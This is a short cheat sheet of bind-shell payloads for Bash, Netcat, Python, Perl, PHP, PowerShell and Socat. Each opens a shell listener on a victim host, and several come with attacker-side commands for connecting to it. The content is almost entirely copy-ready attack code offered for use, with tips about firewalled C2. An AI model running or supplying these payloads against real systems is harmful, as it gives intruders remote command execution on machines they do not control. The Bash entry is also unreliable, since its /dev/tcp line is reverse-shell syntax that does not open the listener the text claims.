# Quick Bind Shells Cheat Sheet

Bind shells open a listener **on the victim**, waiting for the attacker to connect in.

Assumes:
- TARGET = victim IP (e.g., 10.0.0.5)
- PORT = bind port (e.g., 4444)

---

## 🐚 Bash

```bash
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```

(Listener is now on port 4444 of target)

---

## 🦀 Netcat (with `-e`)

### Target (bind shell):
```bash
nc -lvp 4444 -e /bin/bash
```

### Attacker (connect to shell):
```bash
nc 10.0.0.5 4444
```

---

## 🦀 Netcat (no `-e` support)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp 4444 > /tmp/f
```

---

## 🐍 Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();[os.dup2(conn.fileno(),fd) for fd in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

---

## 🧪 Perl

```bash
perl -e 'use Socket;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'
```

---

## 💾 PHP

```php
<?php $sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",4444);socket_listen($sock);$client=socket_accept($sock);while(1){socket_write($client,"$ ");$cmd=trim(socket_read($client,1024));$output=shell_exec($cmd);socket_write($client,$output); } ?>
```

---

## 🪟 PowerShell (Bind Shell)

```powershell
$listener = [System.Net.Sockets.TcpListener]4444; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}
```

---

## 📦 Socat (Bind Shell)

### Target:
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```

### Attacker:
```bash
socat TCP:10.0.0.5:4444 STDOUT
```

---

## 🧯 Tips

- Use bind shells if you **can’t receive incoming connections** (e.g., NAT/firewalled C2)
- Always `sudo` your bind shells if needed to access <1024 ports
- Pair with reverse shells as fallback

---


